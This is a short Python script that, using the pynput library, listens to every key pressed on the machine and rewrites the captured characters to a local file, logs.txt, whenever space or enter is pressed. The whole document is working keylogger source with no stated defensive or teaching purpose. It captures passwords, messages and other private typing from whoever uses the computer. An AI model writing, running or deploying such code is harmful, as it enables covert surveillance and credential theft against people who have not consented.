from pynput.keyboard import Key, Listener

keys = []

def on_press(key) -> None:
    global keys
    keys.append(str(key).replace("'", ""))
    
    if str(key).find("space") > 0 or str(key).find("enter") > 0:
        write_file(keys)

def write_file(keys) -> None:
    with open("logs.txt", "w") as f:
        for key in keys:
            if key.find("space") > 0:
                f.write("\n")
            elif key.find("Key") == -1:   # .find returns -1 when nothing is found
                f.write(key)

with Listener(on_press=on_press) as listener:
    listener.join() # Constantly runs the loop